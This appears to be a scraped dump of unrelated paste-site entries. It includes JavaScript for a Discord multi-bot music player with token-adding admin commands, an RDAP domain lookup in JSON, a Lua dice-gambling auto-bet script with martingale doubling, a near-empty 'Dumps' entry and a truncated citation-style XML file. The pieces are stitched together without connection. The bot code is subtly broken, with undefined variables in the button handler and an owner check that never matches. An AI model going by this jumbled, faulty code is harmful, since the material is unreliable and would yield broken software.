function saveSetupData(botName, channelId, newName) {
  const data = fs.existsSync(setupDataPath) ? JSON.parse(fs.readFileSync(setupDataPath)) : {};
  data[botName] = { roomId: channelId, name: newName };
  fs.writeFileSync(setupDataPath, JSON.stringify(data, null, 2));
}

function getSetupData(botName) {
  if (!fs.existsSync(setupDataPath)) return null;
  const data = JSON.parse(fs.readFileSync(setupDataPath));
  return data[botName];
}

async function searchYouTube(query) {
  if (cache.has(query)) return cache.get(query);
  try {
    const { data } = await axios.get(""https://www.googleapis.com/youtube/v3/search"", {
      params: {
        part: ""snippet"",
        type: ""video"",
        q: query,
        key: yt_api,
        maxResults: 1
      }
    });
    const video = data.items?.[0];
    const url = video ? `https://www.youtube.com/watch?v=${video.id.videoId}` : null;
    if (url) cache.set(query, url);
    return url;
  } catch (err) {
    console.error(""YouTube Search API Error:"", err.response?.data || err);
    return null;
  }
}

async function joinVoiceChannel(client, channel) {
  if (!channel?.joinable) return;
  if (client.distube.voices.get(channel.guild.id)) return;

  try {
    await client.distube.voices.join(channel);
    console.log(`✅ ${client.user.username} joined ${channel.id}`);
  } catch (err) {
    console.warn(`❌ ${client.user.username} failed to join ${channel.id}:`, err.message);
  }
}

config.bots.forEach((botData, index) => {
  setTimeout(() => {
    const client = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.MessageContent
      ],
      partials: [Partials.Channel]
    });

    client.botData = botData;

    client.distube = new DisTube(client, {
      emitNewSongOnly: true,
      plugins: [

        new YtDlpPlugin({ update: true })
      ]
    });

    client.once(Events.ClientReady, async () => {
      const setup = getSetupData(client.user.username);
      if (!setup?.roomId) return;

      for (const [, guild] of client.guilds.cache) {
        const channel = guild.channels.cache.get(setup.roomId);
        if (channel) await joinVoiceChannel(client, channel);
      }
    });

    client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
      const setup = getSetupData(client.user.username);
      if (!setup?.roomId) return;

      const botId = client.user.id;
      const leftVC = oldState.channelId && !newState.channelId && oldState.id === botId;
      if (leftVC) {
        const key = `${botId}-${oldState.guild.id}`;
        if (rejoinLocks.has(key)) return;
        rejoinLocks.add(key);
        setTimeout(() => rejoinLocks.delete(key), 150);

        const channel = oldState.guild.channels.cache.get(setup.roomId);
        if (channel?.joinable) {
          try {
            await joinVoiceChannel(client, channel);
            console.log(`🔁 ${client.user.username} rejoined`);
          } catch (e) {
            console.error(e);
          }
        }
      }
    });


    client.distube.on(""playSong"", async (queue, song) => {
      const embed = new EmbedBuilder()
        .setTitle(""Now playing"")
        .setDescription(`**[${song.name}](${song.url})**`)
        .setThumbnail(song.thumbnail)
        .addFields(
          { name: ""Author"", value: song.uploader?.name || ""Unknown"", inline: true },
          { name: ""Duration"", value: song.formattedDuration || ""--:--"", inline: true }
        )
        .setColor(""Red"");
      const controls = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(""loop"").setStyle(ButtonStyle.Secondary).setEmoji(""<:loop_arqet:1382208868352004218>""),
        new ButtonBuilder().setCustomId(""music_down"").setStyle(ButtonStyle.Secondary).setEmoji(""<:down_arqet:1382208866246332526>""),
        new ButtonBuilder().setCustomId(""stop"").setStyle(ButtonStyle.Secondary).setEmoji(""<:stop_arqet:1382208861162831994>""),
        new ButtonBuilder().setCustomId(""music_up"").setStyle(ButtonStyle.Secondary).setEmoji(""<:up_arqet:1382208863893327942>""),
        new ButtonBuilder().setCustomId(""skip"").setStyle(ButtonStyle.Secondary).setEmoji(""<:skip_arqet:1382213952196575282>""));
      const msg = await queue.textChannel.send({ content:""**↯ Playing**: \`""+song.name+""\` - (\`""+song.formattedDuration+""\`)"", components: [controls] });
    });
  
    client.on(Events.InteractionCreate, async (interaction) => {
      if (!interaction.isButton()) return;
      const queue = client.distube.getQueue(interaction);
      const memberVC = interaction.member.voice?.channelId;
      const botVC = interaction.guild.members.me.voice?.channelId;
  
      if (!queue || memberVC !== botVC) {
        return interaction.reply({ content: ""يجب أن تكون في نفس روم البوت للتحكم."", ephemeral: true });
      }
  
      try {
        switch (interaction.customId) {
              case ""play"":if (!args[0]) return message.reply(""❗ You need to provide a song name or URL."");
              distube.play(voiceChannel, args.join("" ""), { textChannel: message.channel, member: message.member });break;
              case ""pause"":if (!queue.paused) queue.pause();break;
              case ""resume"":if (queue.paused) queue.resume();break;
              case ""skip"":if (queue.songs.length > 1) queue.skip();break;
              case ""stop"":queue.stop(); break;
              case ""loop"":queue.setRepeatMode(queue.repeatMode === 0 ? 1 : 0);break;
              case ""loopqueue"":queue.setRepeatMode(queue.repeatMode === 2 ? 0 : 2);break;
              //case ""volume"":const vol = parseInt(args[0]);if (isNaN(vol) || vol < 0 || vol > 150) return message.reply(""📢 Volume must be between 0 and 150."");queue.setVolume(vol);break;
              case ""music_down"": {if (!queue) return interaction.reply({ content: ""❌ No music playing."", ephemeral: true });
              const vol = Math.max(0, queue.volume - 20);queue.setVolume(vol);await interaction.reply({ content: `🔉 Volume decreased to **${vol}%**`, ephemeral: true });break;}
              case ""music_up"": {if (!queue) return interaction.reply({ content: ""❌ No music playing."", ephemeral: true });
              const vol = Math.min(100, queue.volume + 20);queue.setVolume(vol);await interaction.reply({ content: `🔊 Volume increased to **${vol}%**`, ephemeral: true });break;}
              case ""seek"":const time = parseInt(args[0]);if (isNaN(time)) return message.reply(""⏩ Provide time in seconds to seek."");queue.seek(time);break;
              case ""shuffle"":queue.shuffle();break;
              case ""autoplay"":queue.toggleAutoplay();break;
              case ""nowplaying"":const song = queue.songs[0];message.reply(`🎶 Now Playing: **${song.name}** - \`${song.formattedDuration}\``);break;
              case ""queue"":if (!queue || !queue.songs.length) return message.reply(""📭 The queue is empty."");const q = queue.songs
              .map((song, i) => `${i === 0 ? ""**▶️"" : `${i + 1}.`} ${song.name}** - \`${song.formattedDuration}\``).join(""\n"");message.reply(`🎧 **Queue List:**\n${q}`);break;
              case ""remove"":const index = parseInt(args[0]);if (isNaN(index) || index < 1 || index >= queue.songs.length)return message.reply(""❌ Invalid song number."");
              const removed = queue.songs.splice(index, 1);message.reply(`🗑️ Removed: **${removed[0].name}**`);break;default:message.reply(""Unknown"");break;
        }
        await interaction.deferUpdate();
      } catch (e) {
        console.error(""Interaction error:"", e);
        interaction.reply({ content: ""حدث خطأ."", ephemeral: true });
      }
    });

const client_1 = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const owners = new Set();
owners.add([""159824469899214848""]);
client_1.on(Events.MessageCreate, async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const commandText = args[0]?.toLowerCase();
  if ([""restart"", ""add"", ""addown""].includes(commandText)) {
    if (!owners.has(message.author.id)) {
      return message.react(""❌"");
    }
  }


  if (commandText === ""add"") {
      if (args.length < 2) return message.react(""❌"");
    
      let config = {};
      let tokens = [];
    
      try {
        const data = fs.readFileSync('./config.json', 'utf8');
        config = JSON.parse(data);
        tokens = Array.isArray(config.tokens) ? config.tokens : [];
      } catch (error) {
        console.log(""خطأ في قراءة config.json:"", error);
      }
    
      const newTokens = args.slice(1);
      const existingTokens = tokens.map(t => t.token);
      const duplicateTokens = newTokens.filter(t => existingTokens.includes(t));
    
      if (duplicateTokens.length > 0) {
        return message.reply(`**❌ بعض التوكنات موجودة بالفعل**\n\`${duplicateTokens.join('\n')}\``)
          .then(msg => setTimeout(() => { msg.delete(); message.delete(); }, 5000));
      }
    
      newTokens.forEach(t => tokens.push({ token: t }));
      config.tokens = tokens;
    
      try {
        fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
        message.reply(`✅ تم إضافة التوكنات:\n\`${newTokens.join('\n')}\``)
          .then(msg => setTimeout(() => { msg.delete(); message.delete(); }, 5000));
      } catch (e) {
        console.error(""خطأ في حفظ التوكنات:"", e);
        message.react(""❌"");
      }
    
      return;
    }
    

  if (commandText === ""addown"") {
    const userId = args[1]?.replace(/<@!?(\d+)>/, ""$1"");
    if (!userId) return message.reply(""❌ الرجاء كتابة معرف المستخدم أو منشنه."");
    if (userId === ""159824469899214848"") return message.react(""❌"");
    if (owners.has(userId)) return message.react(""❌"");

    owners.add(userId);
    message.react(""✅"");
    return;
  }
});
    client_1.login(config.main_bot);

    client.on(Events.MessageCreate, async (message) => {
      if (!message.guild || message.author.bot) return;
      const args = message.content.trim().split(/ +/);
      const commandText = args[0]?.toLowerCase();
      const query = args.slice(1).join("" "");
      const vc = message.member.voice.channel;
      const setup = getSetupData(client.user.username);
      const allowedRoom = setup?.roomId;
      const queue = client.distube.getQueue(message);

    if (message.mentions.has(client.user)) {
      const cmd = args[1]?.toLowerCase();
      const imgURL = message.attachments.first()?.url || args[2];

      if (cmd === ""setup"") {
        if (!vc) return message.react(""❌"");
        try {
          await client.user.setUsername(vc.name);
          saveSetupData(client.user.username, vc.id, vc.name);
          await client.distube.voices.join(vc);
          await message.react(""✅"");
          setTimeout(() => {
            client.user.setUsername(client.botData.name).catch(() => {});
          }, 86400000);
        } catch (e) {
          console.error(""Setup error:"", e);
          message.react(""❌"");
        }
      }

      if (cmd === ""sa"" && imgURL) {
        try {
          await client.user.setAvatar(imgURL);
          message.react(""✅"");
        } catch (e) {
          console.error(""Avatar error:"", e);
          message.react(""❌"");
        }
      }

      if (cmd === ""sb"" && imgURL) {
        try {
          await client.user.setBanner(imgURL);
          message.react(""✅"");
        } catch (e) {
          console.error(""Banner error:"", e);
          message.react(""❌"");
        }
      }
      if (cmd === ""sn"" && args.length) {
        try {
          await client.user.setUsername(args.join("" ""));
          message.react(""✅"");
        } catch (e) {
          console.error(""Username error:"", e);
          message.react(""❌"");
        }
      }
    }  
      if (!vc || vc.id !== allowedRoom) return;
  
      if ([""ش"", ""شغل""].includes(commandText) && query) {
        let url = query;
        try {
          await client.distube.play(vc, query, { textChannel: message.channel, member: message.member });
        } catch (err) {
          console.warn(""DisTube play failed, trying YouTube API fallback"");
          url = await searchYouTube(query);
          if (!url) return message.react(""❌"");
          try {
            await client.distube.play(vc, url, { textChannel: message.channel, member: message.member });
          } catch (e) {
            console.error(""Play error after fallback:"", e);
            message.react(""❌"");
          }
        }
      }
  
      if ([""وقف"", ""ايقاف""].includes(commandText)) {
        if (queue) queue.stop(), message.react(""<:stop_arqet:1382208861162831994>"");
        else message.react(""❌"");
      }
  
      if ([""سكب"", ""تخطي""].includes(commandText)) {
        if (queue?.songs.length > 1) queue.skip(), message.react(""<:skip_arqet:1382213952196575282>"");
        else message.react(""❌"");
      }
  
      if ([""قائمة"", ""list"", ""queue""].includes(commandText)) {
      if (!queue?.songs.length) return message.react(""❌"");const list = queue.songs.map((s, i) => `${i === 0 ? ""🔊"" : `${i + 1}.`} ${s.name} - \`${s.formattedDuration}\``).join(""\n"");message.reply(`🎶 **قائمة التشغيل:**\n${list}`);}
      if ([""وقّف"", ""بوز"", ""توقيف"", ""ايقاف مؤقت"", ""pause""].includes(commandText)) {if (queue && !queue.paused) queue.pause(), message.react(""<:stop_arqet:1382208861162831994>"");else message.react(""❌"");}
      if ([""كمل"", ""استئناف"", ""resume""].includes(commandText)) {if (queue?.paused) queue.resume(), message.react(""<:start_arqet:1382208858692255854>"");else message.react(""❌"");}
      if ([""صوت"", ""vol"", ""volume""].includes(commandText)) {
        const vol = parseInt(args[1]);
        if (isNaN(vol) || vol < 0 || vol > 100) return message.reply(""❌ اكتب رقم بين 0 و 100"");
        queue.setVolume(vol);
        return message.reply(`🔊 تم ضبط الصوت على ${vol}%`);
      }
      
      if ([""تكرار"", ""loop""].includes(commandText)) {
      if (queue) {const mode = queue.repeatMode === 0 ? 1 : queue.repeatMode === 1 ? 2 : 0;queue.setRepeatMode(mode); message.react([""<:loop_arqet:1382208868352004218>"", ""<:loop_arqet:1382208868352004218>"", ""<:loop_arqet:1382208868352004218>""][mode]);} else message.react(""❌"");
      }
      
      if ([""عشوائي"", ""shuffle""].includes(commandText)) {
        if (queue) queue.shuffle(), message.react(""🔀"");
        else message.react(""❌"");
      }
      
      if ([""ازالة"", ""remove""].includes(commandText)) {
        const index = parseInt(args[1]);
        if (!queue || isNaN(index) || index <= 0 || index >= queue.songs.length) {
          return message.reply(""❌ رقم غير صحيح أو لا توجد قائمة"");
        }
        queue.songs.splice(index, 1);
        message.reply(`🗑️ تم حذف الأغنية رقم ${index}`);
      }
      
      if ([""الان"", ""now"", ""np"", ""nowplaying""].includes(commandText)) {
        if (!queue?.songs.length) return message.react(""❌"");
        const song = queue.songs[0];
        const nowPlaying = `🎵 **الآن:** [${song.name}](${song.url}) - \`${song.formattedDuration}\``;
        message.reply(nowPlaying);
      }
      
      if ([""اوامر"", ""help"", ""commands""].includes(commandText)) {
        const helpText = `**أوامر الميوزك:**\n` +
          `• تشغيل: ش, شغل <كلمة أو رابط>\n` +
          `• إيقاف: وقف, ايقاف\n` +
          `• تخطي: سكب, تخطي\n` +
          `• إيقاف مؤقت: وقّف, بوز\n` +
          `• استئناف: كمل\n` +
          `• قائمة التشغيل: قائمة, list\n` +
          `• تكرار: تكرار\n` +
          `• الصوت: صوت <0-100>\n` +
          `• عشوائي: عشوائي\n` +
          `• الآن: الان, now\n` +
          `• ازالة: ازالة <رقم>`;
        message.reply(helpText);
      }
      
    });

    
    client.on(""error"", error => {
      if (error.message?.includes(""Cannot connect to the voice channel after 30 seconds"")) return;
      const name = client?.user?.username || ""Unknown"";
      console.error(`[${name}] Uncaught Error:`, error);
    });
    const name_1 = client?.user?.username || ""Unknown"";
    process.on(""unhandledRejection"", () => console.error());
    process.on(""uncaughtException"", (err) => console.error(`[${name_1}] Uncaught Exception:`, err));
    process.on(""uncaughtExceptionMonitor"", (err) => console.warn(`[${name_1}] Exception Monitor:`, err));

    client.login(botData.token);
    bots.push(client);
  }, index * 50);
});
const admin = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

admin.on(Events.MessageCreate, async (message) => {
  if (!message.guild || message.author.bot) return;
  const args = message.content.trim().split(/ +/);
  const command = args[0]?.toLowerCase();

  if (!owners.has(message.author.id)) return;

  if (command === ""addtoken"") {
    const newToken = args[1];
    if (!newToken) return message.reply(""ex: addtoken [token_bot]"");
    const tokens = loadTokens();
    if (tokens.includes(newToken)) return message.react(""❌"");
    tokens.push(newToken);
    saveTokens(tokens);
    startBot(newToken);
    message.react(""✅"");
  }

  const failedTokens =[];
  if (command === ""info-tokens"") {
      const descriptionLines = [];

      bots.forEach(bot => {
        const nameTag = bot.user?.tag || ""Unknown#0000"";
        const _1 = bot.user?.id || ""1"";
        const tokenPreview = bot.token?.slice(0, 10) || ""??????????"";
        descriptionLines.push(
          `[${nameTag}](https://discord.com/oauth2/authorize?client_id=${_1}&permissions=0&integration_type=0&scope=bot) [token: ${tokenPreview}...]`
        );
      });
      
      if (failedTokens.length > 0) {
        failedTokens.forEach(t => {
          descriptionLines.push(`[FAILED] [token: ${t.slice(0, 10)}...] ❌`);
        });
      }
      
      
      const MAX_LENGTH = 4000;
      const embeds = [];
      let lines = [];
      let length = 0;
      
      for (const line of descriptionLines) {
        const lineLength = line.length + 1;
        if (length + lineLength > MAX_LENGTH) {
          embeds.push(
            new EmbedBuilder()
              .setTitle(""حالة التوكنات"")
              .setDescription(lines.join(""\n""))
              .setColor(""Blue"")
          );
          lines = [];
          length = 0;
        }
      
        lines.push(line);
        length += lineLength;
      }
      
      if (lines.length > 0) {
        embeds.push(
          new EmbedBuilder()
            .setTitle(""حالة التوكنات"")
            .setDescription(lines.join(""\n""))
            .setColor(""Blue"")
        );
      }
      
      
      for (const embed of embeds) {
        await message.channel.send({ embeds: [embed] });
      }
 }

    
    
});"
dgsCE6gr,admin music,BETAlwrd,JavaScript,Tuesday 17th of June 2025 01:03:33 AM CDT,"const admin = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

admin.on(Events.MessageCreate, async (message) => {
  if (!message.guild || message.author.bot) return;
  const args = message.content.trim().split(/ +/);
  const command = args[0]?.toLowerCase();

  if (!owners.has(message.author.id)) return;

  if (command === ""addtoken"") {
    const newToken = args[1];
    if (!newToken) return message.reply(""ex: addtoken [token_bot]"");
    const tokens = loadTokens();
    if (tokens.includes(newToken)) return message.react(""❌"");
    tokens.push(newToken);
    saveTokens(tokens);
    startBot(newToken);
    message.react(""✅"");
  }

  const failedTokens =[];
  if (command === ""info-tokens"") {
      const descriptionLines = [];

      bots.forEach(bot => {
        const nameTag = bot.user?.tag || ""Unknown#0000"";
        const _1 = bot.user?.id || ""1"";
        const tokenPreview = bot.token?.slice(0, 10) || ""??????????"";
        descriptionLines.push(
          `[${nameTag}](https://discord.com/oauth2/authorize?client_id=${_1}&permissions=0&integration_type=0&scope=bot) [token: ${tokenPreview}...]`
        );
      });
      
      if (failedTokens.length > 0) {
        failedTokens.forEach(t => {
          descriptionLines.push(`[FAILED] [token: ${t.slice(0, 10)}...] ❌`);
        });
      }
      
      
      const MAX_LENGTH = 4000;
      const embeds = [];
      let lines = [];
      let length = 0;
      
      for (const line of descriptionLines) {
        const lineLength = line.length + 1;
        if (length + lineLength > MAX_LENGTH) {
          embeds.push(
            new EmbedBuilder()
              .setTitle(""حالة التوكنات"")
              .setDescription(lines.join(""\n""))
              .setColor(""Blue"")
          );
          lines = [];
          length = 0;
        }
      
        lines.push(line);
        length += lineLength;
      }
      
      if (lines.length > 0) {
        embeds.push(
          new EmbedBuilder()
            .setTitle(""حالة التوكنات"")
            .setDescription(lines.join(""\n""))
            .setColor(""Blue"")
        );
      }
      
      
      for (const embed of embeds) {
        await message.channel.send({ embeds: [embed] });
      }
 }

    
    
});

admin.login(config.main_bot);"
3vsBnqVc,Untitled,kuznetsov420,JSON,Tuesday 17th of June 2025 12:50:35 AM CDT,"{
  ""rdapConformance"": [
    ""rdap_level_0"",
    ""icann_rdap_response_profile_0"",
    ""icann_rdap_technical_implementation_guide_0""
  ],
  ""objectClassName"": ""domain"",
  ""entities"": [
    {
      ""objectClassName"": ""entity"",
      ""entities"": [
        {
          ""objectClassName"": ""entity"",
          ""roles"": [
            ""abuse""
          ],
          ""status"": [
            ""active""
          ],
          ""vcardArray"": [
            ""vcard"",
            [
              [
                ""version"",
                {},
                ""text"",
                ""4.0""
              ],
              [
                ""fn"",
                {},
                ""text"",
                ""Abuse Team""
              ],
              [
                ""tel"",
                {
                  ""type"": [
                    ""voice""
                  ]
                },
                ""uri"",
                ""tel:+1.4153197517""
              ],
              [
                ""email"",
                {},
                ""text"",
                ""registrar-abuse@cloudflare.com""
              ]
            ]
          ]
        }
      ],
      ""handle"": ""1910"",
      ""links"": [
        {
          ""href"": ""https://pubapi.registry.google/rdap/entity/1910"",
          ""rel"": ""self"",
          ""type"": ""application/rdap+json""
        }
      ],
      ""publicIds"": [
        {
          ""identifier"": ""1910"",
          ""type"": ""IANA Registrar ID""
        }
      ],
      ""remarks"": [
        {
          ""description"": [
            ""Summary data only. For complete data, send a specific query for the object.""
          ],
          ""title"": ""Incomplete Data"",
          ""type"": ""object truncated due to unexplainable reasons""
        }
      ],
      ""roles"": [
        ""registrar""
      ],
      ""vcardArray"": [
        ""vcard"",
        [
          [
            ""version"",
            {},
            ""text"",
            ""4.0""
          ],
          [
            ""fn"",
            {},
            ""text"",
            ""CloudFlare, Inc.""
          ]
        ]
      ]
    },
    {
      ""objectClassName"": ""entity"",
      ""handle"": """",
      ""remarks"": [
        {
          ""description"": [
            ""Some of the data in this object has been removed."",
            ""Contact personal data is visible only to the owning registrar.""
          ],
          ""links"": [
            {
              ""href"": ""https://github.com/google/nomulus/blob/master/docs/rdap.md#authentication"",
              ""rel"": ""alternate"",
              ""type"": ""text/html""
            }
          ],
          ""title"": ""REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        },
        {
          ""description"": [
            ""Please query the RDDS service of the Registrar of Record identifies in this output for information on how to contact the Registrant of the queried domain name.""
          ],
          ""title"": ""EMAIL REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        }
      ],
      ""roles"": [
        ""administrative""
      ],
      ""vcardArray"": [
        ""vcard"",
        [
          [
            ""version"",
            {},
            ""text"",
            ""4.0""
          ],
          [
            ""fn"",
            {},
            ""text"",
            """"
          ]
        ]
      ]
    },
    {
      ""objectClassName"": ""entity"",
      ""handle"": """",
      ""remarks"": [
        {
          ""description"": [
            ""Some of the data in this object has been removed."",
            ""Contact personal data is visible only to the owning registrar.""
          ],
          ""links"": [
            {
              ""href"": ""https://github.com/google/nomulus/blob/master/docs/rdap.md#authentication"",
              ""rel"": ""alternate"",
              ""type"": ""text/html""
            }
          ],
          ""title"": ""REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        },
        {
          ""description"": [
            ""Please query the RDDS service of the Registrar of Record identifies in this output for information on how to contact the Registrant of the queried domain name.""
          ],
          ""title"": ""EMAIL REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        }
      ],
      ""roles"": [
        ""billing""
      ],
      ""vcardArray"": [
        ""vcard"",
        [
          [
            ""version"",
            {},
            ""text"",
            ""4.0""
          ],
          [
            ""fn"",
            {},
            ""text"",
            """"
          ]
        ]
      ]
    },
    {
      ""objectClassName"": ""entity"",
      ""handle"": """",
      ""remarks"": [
        {
          ""description"": [
            ""Some of the data in this object has been removed."",
            ""Contact personal data is visible only to the owning registrar.""
          ],
          ""links"": [
            {
              ""href"": ""https://github.com/google/nomulus/blob/master/docs/rdap.md#authentication"",
              ""rel"": ""alternate"",
              ""type"": ""text/html""
            }
          ],
          ""title"": ""REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        },
        {
          ""description"": [
            ""Please query the RDDS service of the Registrar of Record identifies in this output for information on how to contact the Registrant of the queried domain name.""
          ],
          ""title"": ""EMAIL REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        }
      ],
      ""roles"": [
        ""technical""
      ],
      ""vcardArray"": [
        ""vcard"",
        [
          [
            ""version"",
            {},
            ""text"",
            ""4.0""
          ],
          [
            ""fn"",
            {},
            ""text"",
            """"
          ]
        ]
      ]
    },
    {
      ""objectClassName"": ""entity"",
      ""handle"": """",
      ""remarks"": [
        {
          ""description"": [
            ""Some of the data in this object has been removed."",
            ""Contact personal data is visible only to the owning registrar.""
          ],
          ""links"": [
            {
              ""href"": ""https://github.com/google/nomulus/blob/master/docs/rdap.md#authentication"",
              ""rel"": ""alternate"",
              ""type"": ""text/html""
            }
          ],
          ""title"": ""REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        },
        {
          ""description"": [
            ""Please query the RDDS service of the Registrar of Record identifies in this output for information on how to contact the Registrant of the queried domain name.""
          ],
          ""title"": ""EMAIL REDACTED FOR PRIVACY"",
          ""type"": ""object redacted due to authorization""
        }
      ],
      ""roles"": [
        ""registrant""
      ],
      ""vcardArray"": [
        ""vcard"",
        [
          [
            ""version"",
            {},
            ""text"",
            ""4.0""
          ],
          [
            ""fn"",
            {},
            ""text"",
            """"
          ]
        ]
      ]
    }
  ],
  ""events"": [
    {
      ""eventAction"": ""registration"",
      ""eventActor"": ""cloudflare"",
      ""eventDate"": ""2025-06-17T00:30:49.504Z""
    },
    {
      ""eventAction"": ""expiration"",
      ""eventDate"": ""2026-06-17T00:30:49.504Z""
    },
    {
      ""eventAction"": ""last update of RDAP database"",
      ""eventDate"": ""2025-06-17T05:47:14.459Z""
    },
    {
      ""eventAction"": ""last changed"",
      ""eventDate"": ""2025-06-17T00:35:55.528Z""
    }
  ],
  ""handle"": ""E0F48848A-APP"",
  ""ldhName"": ""stoickr.app"",
  ""links"": [
    {
      ""href"": ""https://pubapi.registry.google/rdap/domain/stoickr.app"",
      ""rel"": ""self"",
      ""type"": ""application/rdap+json""
    },
    {
      ""href"": ""https://rdap.cloudflare.com/rdap/v1/domain/stoickr.app"",
      ""rel"": ""related"",
      ""type"": ""application/rdap+json""
    }
  ],
  ""nameservers"": [
    {
      ""objectClassName"": ""nameserver"",
      ""handle"": ""2EF7ED1_SOY-GOOGLE"",
      ""ldhName"": ""nelly.ns.cloudflare.com"",
      ""links"": [
        {
          ""href"": ""https://pubapi.registry.google/rdap/nameserver/nelly.ns.cloudflare.com"",
          ""rel"": ""self"",
          ""type"": ""application/rdap+json""
        }
      ],
      ""remarks"": [
        {
          ""description"": [
            ""Summary data only. For complete data, send a specific query for the object.""
          ],
          ""title"": ""Incomplete Data"",
          ""type"": ""object truncated due to unexplainable reasons""
        }
      ]
    },
    {
      ""objectClassName"": ""nameserver"",
      ""handle"": ""4CC5522_SOY-GOOGLE"",
      ""ldhName"": ""oswald.ns.cloudflare.com"",
      ""links"": [
        {
          ""href"": ""https://pubapi.registry.google/rdap/nameserver/oswald.ns.cloudflare.com"",
          ""rel"": ""self"",
          ""type"": ""application/rdap+json""
        }
      ],
      ""remarks"": [
        {
          ""description"": [
            ""Summary data only. For complete data, send a specific query for the object.""
          ],
          ""title"": ""Incomplete Data"",
          ""type"": ""object truncated due to unexplainable reasons""
        }
      ]
    }
  ],
  ""secureDNS"": {
    ""delegationSigned"": false,
    ""zoneSigned"": true
  },
  ""status"": [
    ""add period"",
    ""client transfer prohibited""
  ],
  ""notices"": [
    {
      ""description"": [
        ""By querying our Domain Database as part of the RDAP pilot program (RDAP Domain Database), you are agreeing to comply with these terms and acknowledging that your information will be used in accordance with Charleston Road Registry's Privacy Policy (https://www.registry.google/about/privacy.html), so please read the terms and Privacy Policy carefully."",
        ""Any information provided is 'as is' without any guarantee of accuracy."",
        ""Please do not misuse the RDAP Domain Database. It is intended solely for query-based access on an experimental basis and should not be used for or relied upon for any other purpose."",
        ""Don't use the RDAP Domain Database to allow, enable, or otherwise support the transmission of mass unsolicited, commercial advertising or solicitations."",
        ""Don't access our RDAP Domain Database through the use of high volume, automated electronic processes that send queries or data to the systems of Charleston Road Registry or any ICANN-accredited registrar."",
        ""You may only use the information contained in the RDAP Domain Database for lawful purposes."",
        ""Do not compile, repackage, disseminate, or otherwise use the information contained in the RDAP Domain Database in its entirety, or in any substantial portion, without our prior written permission."",
        ""We may retain certain details about queries to our RDAP Domain Database for the purposes of detecting and preventing misuse."",
        ""We reserve the right to restrict or deny your access to the RDAP Domain Database if we suspect that you have failed to comply with these terms."",
        ""We reserve the right to modify or discontinue our participation in the RDAP pilot program and suspend or terminate access to the RDAP Domain Database at any time and for any reason in our sole discretion."",
        ""Reminder that underlying Registrant data may be requested via ICANN's RDRS service (https://rdrs.icann.org/)."",
        ""We reserve the right to modify this agreement at any time."",
        """"
      ],
      ""links"": [
        {
          ""href"": ""https://pubapi.registry.google/rdap/help/tos"",
          ""rel"": ""self"",
          ""type"": ""application/rdap+json""
        },
        {
          ""href"": ""https://www.registry.google/policies/rdap-terms/"",
          ""rel"": ""alternate"",
          ""type"": ""text/html""
        }
      ],
      ""title"": ""RDAP Terms of Service""
    },
    {
      ""description"": [
        ""This response conforms to the RDAP Operational Profile for gTLD Registries and Registrars version 1.0""
      ]
    },
    {
      ""description"": [
        ""For more information on domain status codes, please visit https://icann.org/epp""
      ],
      ""links"": [
        {
          ""href"": ""https://icann.org/epp"",
          ""rel"": ""alternate"",
          ""type"": ""text/html""
        }
      ],
      ""title"": ""Status Codes""
    },
    {
      ""description"": [
        ""URL of the ICANN RDDS Inaccuracy Complaint Form: https://icann.org/wicf""
      ],
      ""links"": [
        {
          ""href"": ""https://icann.org/wicf"",
          ""rel"": ""alternate"",
          ""type"": ""text/html""
        }
      ],
      ""title"": ""RDDS Inaccuracy Complaint Form""
    }
  ]
}"
tKgyhd1B,APK STRATEGI 5,Hackdicecode,C++,Tuesday 17th of June 2025 12:46:23 AM CDT,"basebet = 0.1
minbet = 0.1
basech = 10
recoverCh = 47
target = 1
stopLoss = -10
maxBet = 5
lossCount = 0
lossLimit = 3
inRecovery = false

chance = basech
nextbet = basebet

function dobet()
    if profit >= target or profit <= stopLoss then stop() end

    if win then
        lossCount = 0
        if inRecovery then
            inRecovery = false
            nextbet = basebet
            chance = basech
        end
    else
        lossCount = lossCount + 1
    end

    if lossCount >= lossLimit then
        inRecovery = true
    end

    if inRecovery then
        chance = recoverCh
        nextbet = previousbet * 2
        if nextbet > maxBet then nextbet = maxBet end
    else
        chance = basech
        nextbet = basebet
    end

    bethigh = math.random(2) == 1
end"
RDtpNpfA,Dumps,LVL23HT,CSS,Monday 16th of June 2025 11:35:38 PM CDT,Seess
kH2MHEqh,Harvard - Cardiff University (ITS),swardiantara,XML,Monday 16th of June 2025 10:32:34 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<style xmlns=""http://purl.org/net/xbiblio/csl"" class=""in-text"" version=""1.0"" demote-non-dropping-particle=""sort-only"">
  <info>
    <title>Cardiff University - Harvard (ITS)</title>
    <id>http://www.zotero.org/styles/cardiff-university-harvard</id>
    <link href=""http://www.zotero.org/styles/cardiff-university-harvard"" rel=""self""/>
    <link href=""https://xerte.cardiff.ac.uk/play_4191"" rel=""documentation""/>
    <link href=""https://xerte.cardiff.ac.uk/play_4069"" rel=""documentation""/>
    <link href=""https://github.com/citation-style-language/styles/pull/3676#issuecomment-420542651"" rel=""documentation""/>
    <author>
      <name>Zoe Young</name>
      <email>youngz@cardiff.ac.uk</email>
    </author>
    <author>
      <name>Lewys Peters</name>
    </author>
    <contributor>
      <name>Patrick O'Brien</name>
    </contributor>
    <category citation-format=""author-date""/>
    <summary>The Harvard author-date style - adapted for Cardiff University</summary>
    <updated>2025-05-18T00:55:38+00:00</updated>
